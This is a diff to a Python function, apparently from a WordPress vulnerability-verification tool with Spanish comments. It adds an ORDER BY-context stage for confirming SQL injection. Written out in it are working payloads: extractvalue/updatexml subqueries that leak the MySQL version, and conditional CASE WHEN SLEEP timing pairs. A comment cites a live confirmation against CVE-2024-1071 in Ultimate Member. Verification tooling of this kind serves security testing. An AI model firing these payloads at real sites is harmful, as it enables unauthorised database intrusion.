@@ -2032,7 +2032,7 @@ def verify_wordpress_sqli(
     extra_nonce_pages: Optional[list] = None,
     extra_setup_trigger_paths: Optional[list] = None,
 ) -> WpVerifyResult:
-    """Verifica SQL injection con TRES tecnicas, de mas a menos dura, probando varios contextos
+    """Verifica SQL injection con CINCO tecnicas, de mas a menos dura, probando varios contextos
     de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
     estilos de comentario (-- -, #) en cada una, porque el contexto real del query no se puede
     saber sin leer el codigo:
@@ -2049,9 +2049,22 @@ def verify_wordpress_sqli(
        de condiciones TRUE/FALSE inyectadas; se marca verificado solo si al menos 2 de 3 pares
        muestran una diferencia de respuesta CONSISTENTE y el caso TRUE se comporta como la
        peticion de control.
-    4) time-based blind (ultimo recurso, si ninguna de las anteriores funciono): SLEEP(5) vs
-       SLEEP(0) en la misma condicion -- si el retraso es consistente en al menos 2 de 3 pares,
-       es indicio de inyeccion ciega sin ninguna diferencia visible en el contenido.
+    4) time-based blind (contexto WHERE, solo si (1)-(3) no funcionaron): SLEEP(5) vs SLEEP(0)
+       en la misma condicion -- si el retraso es consistente en al menos 2 de 3 pares, es
+       indicio de inyeccion ciega sin ninguna diferencia visible en el contenido.
+    5) contexto ORDER BY (ultimo recurso, solo si (1)-(4) no funcionaron): las 4 tecnicas
+       anteriores asumen que el valor original sigue formando parte de una clausula WHERE real
+       (el payload es '<valor><cierre> AND/OR <condicion>') -- un sumidero que mete el
+       parametro DIRECTAMENTE en un ORDER BY (p.ej. WP_User_Query 'orderby' sin whitelist --
+       confirmado en vivo contra CVE-2024-1071, Ultimate Member, parametro 'sorting') nunca
+       puede confirmarse asi: no hay WHERE al que concatenar nada, y una comilla solo rompe la
+       sintaxis de la columna/expresion en vez de cerrar una cadena. Aqui el valor INYECTADO ES
+       la expresion COMPLETA (subconsulta escalar, sin AND/OR/comillas/comentario): primero
+       error-based (extractvalue/updatexml bare), luego time-based CONDICIONAL (CASE WHEN
+       1=1/1=2, mismo SLEEP -- mas riguroso que un SLEEP incondicional: aisla que una CONDICION
+       real controla el retraso, no que la posicion simplemente acepte 'SLEEP' sin mas). Nunca
+       exclusivo de este plugin -- cualquier columna/orderby dinamico sin whitelist cae en el
+       mismo patron.
 
     `detail` deja explicito con cual de las tecnicas se confirmo, para que el analista sepa que
     tan dura es la prueba.
@@ -2397,19 +2410,127 @@ def verify_wordpress_sqli(
             step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
                  f"mostraron retraso consistente")
         else:
-            res.ok = True
-            # el cuerpo real de la peticion de CONTROL (la mas simple de todas) es la pista mas
-            # util para diagnosticar un negativo sin relanzar el ataque a mano: un error fatal
-            # de PHP, un redirect inesperado, o un cuerpo vacio apuntan a algo del servidor/la
-            # ruta del ataque, no a que el payload sea el equivocado.
-            control_sample = res.evidence.get("respuesta_control_recorte") or ""
-            res.detail = (f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) "
-                          f"no filtraron version(), boolean-blind no mostro diferencia consistente "
-                          f"({consistent_diffs}/{len(pairs)}) y time-based blind tampoco "
-                          f"({timing_consistent}/{len(timing_pairs)}) -- la inyeccion SQL no se "
-                          f"confirmo" +
-                          (f". Respuesta real de la peticion de control: {control_sample!r}"
-                           if control_sample else ""))
+            # ultimo recurso (5): contexto ORDER BY. Todo lo anterior asume una clausula WHERE
+            # -- el payload es '<valor original><cierre> AND/OR <condicion>', apoyado en que el
+            # valor original SIGUE siendo parte de una comparacion real. Un sumidero que mete el
+            # parametro DIRECTAMENTE en un ORDER BY (p.ej. WP_User_Query 'orderby' sin whitelist
+            # -- confirmado en vivo contra CVE-2024-1071, Ultimate Member, parametro 'sorting':
+            # sorting_query() hace literalmente `$this->query_args['orderby'] = $sortby;` con el
+            # valor del POST sin pasar por ningun escape) nunca puede confirmarse con esos
+            # payloads: no hay ninguna clausula WHERE a la que concatenar un AND/OR, y una
+            # comilla simplemente rompe la sintaxis de una columna/expresion de ORDER BY en vez
+            # de cerrar una cadena -- el motor devuelve un error de sintaxis ajeno a la
+            # inyeccion, no una diferencia explotable. Aqui el valor INYECTADO ES la expresion
+            # COMPLETA (sin AND/OR, sin comillas, sin comentario): una subconsulta escalar es
+            # sintacticamente valida como columna de ORDER BY en MySQL, así que sirve igual
+            # de bien para error-based (su resultado se evalua igual) y para time-based. Nunca
+            # es exclusivo de este plugin -- cualquier ORDER BY/columna dinamica sin whitelist
+            # cae en el mismo patron.
+            step("time-based blind (contexto WHERE) tampoco mostro diferencia; probando "
+                 "contexto ORDER BY -- el valor inyectado es una subconsulta completa, sin "
+                 "AND/OR ni comillas...")
+            orderby_error_payloads = [
+                "(SELECT extractvalue(1,concat(0x7e,version())))",
+                "(SELECT updatexml(1,concat(0x7e,version()),1))",
+            ]
+            orderby_error_tried = []
+            orderby_error_found = None
+            for payload_val in orderby_error_payloads:
+                try:
+                    r = send(payload_val)
+                except Exception as e:
+                    orderby_error_tried.append({"payload": payload_val, "error": str(e)})
+                    continue
+                new_versions = (set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or ""))
+                               - version_noise)
+                orderby_error_tried.append({
+                    "payload": payload_val, "status": r.status_code,
+                    "version_nueva": sorted(new_versions),
+                    "respuesta_cuerpo_recorte": (r.text or "")[:300]})
+                if new_versions:
+                    orderby_error_found = (payload_val, sorted(new_versions)[0])
+                    break
+            res.evidence["orderby_error_intentos"] = orderby_error_tried
+
+            orderby_timing_consistent = 0
+            orderby_timing_tried: List[dict] = []
+            if orderby_error_found:
+                payload_val, mysql_version = orderby_error_found
+                res.verified = True
+                res.ok = True
+                res.evidence["tecnica"] = "order-by-context-error-based"
+                res.evidence["mysql_version_extraida"] = mysql_version
+                res.evidence["payload_ganador"] = payload_val
+                res.detail = (f"SQLI VERIFICADA (error-based, contexto ORDER BY): la version "
+                              f"real de MySQL ({mysql_version}) aparecio en el mensaje de error "
+                              f"XPATH al mandar el parametro como una subconsulta escalar "
+                              f"DIRECTA (sin AND/OR ni comillas) -- confirma que el sumidero "
+                              f"mete el valor en una clausula ORDER BY, no WHERE")
+                step(f"VERIFICADO (error-based, contexto ORDER BY): version real de MySQL "
+                     f"({mysql_version}) extraida del mensaje de error")
+            else:
+                # time-based CONDICIONAL (CASE WHEN) en el mismo contexto -- mas riguroso que un
+                # SLEEP incondicional: demuestra que una CONDICION real controla el retraso, no
+                # solo que 'SLEEP' sea aceptado ahi por casualidad (p.ej. si el motor evalua la
+                # subconsulta una vez por fila a ordenar, un SLEEP incondicional escalaria con
+                # el numero de filas y daria un retraso real que no prueba nada sobre si HAY
+                # inyeccion -- el par condicional (1=1 vs 1=2, mismo SLEEP) aisla justamente eso.
+                step("error-based en contexto ORDER BY no filtro nada; probando time-based "
+                     "CONDICIONAL (CASE WHEN) en el mismo contexto...")
+                orderby_timing_pairs = [
+                    ("(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
+                     "(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
+                    ("(SELECT SLEEP(5))", "(SELECT SLEEP(0))"),
+                ]
+                for slow_p, fast_p in orderby_timing_pairs:
+                    try:
+                        t0_f = time.time()
+                        send(fast_p)
+                        fast_s = time.time() - t0_f
+                        t0_sl = time.time()
+                        send(slow_p)
+                        slow_s = time.time() - t0_sl
+                    except Exception as e:
+                        orderby_timing_tried.append({"slow": slow_p, "fast": fast_p,
+                                                     "error": str(e)})
+                        continue
+                    delayed = (slow_s - fast_s) >= 3.5
+                    orderby_timing_tried.append({
+                        "slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
+                        "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
+                    if delayed:
+                        orderby_timing_consistent += 1
+                res.evidence["orderby_timing_intentos"] = orderby_timing_tried
+                if orderby_timing_consistent >= 1:
+                    res.verified = True
+                    res.ok = True
+                    res.evidence["tecnica"] = "order-by-context-time-based"
+                    res.detail = (f"SQLI VERIFICADA (time-based, contexto ORDER BY): "
+                                  f"{orderby_timing_consistent}/{len(orderby_timing_pairs)} "
+                                  f"subconsultas escalares (sin AND/OR ni comillas) mostraron "
+                                  f"un retraso consistente de al menos ~3.5s -- confirma que el "
+                                  f"sumidero mete el valor directamente en una clausula ORDER BY")
+                    step(f"VERIFICADO (time-based, contexto ORDER BY): "
+                         f"{orderby_timing_consistent}/{len(orderby_timing_pairs)} subconsultas "
+                         f"mostraron retraso consistente")
+            if not res.verified:
+                res.ok = True
+                # el cuerpo real de la peticion de CONTROL (la mas simple de todas) es la pista
+                # mas util para diagnosticar un negativo sin relanzar el ataque a mano: un error
+                # fatal de PHP, un redirect inesperado, o un cuerpo vacio apuntan a algo del
+                # servidor/la ruta del ataque, no a que el payload sea el equivocado.
+                control_sample = res.evidence.get("respuesta_control_recorte") or ""
+                res.detail = (
+                    f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) no "
+                    f"filtraron version(), boolean-blind no mostro diferencia consistente "
+                    f"({consistent_diffs}/{len(pairs)}), time-based blind (contexto WHERE) "
+                    f"tampoco ({timing_consistent}/{len(timing_pairs)}), y ni error-based ni "
+                    f"time-based condicional en contexto ORDER BY (subconsulta directa, sin "
+                    f"AND/OR ni comillas; {orderby_timing_consistent}/"
+                    f"{len(orderby_timing_tried) or 1}) mostraron ninguna senal -- la inyeccion "
+                    f"SQL no se confirmo" +
+                    (f". Respuesta real de la peticion de control: {control_sample!r}"
+                     if control_sample else ""))
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
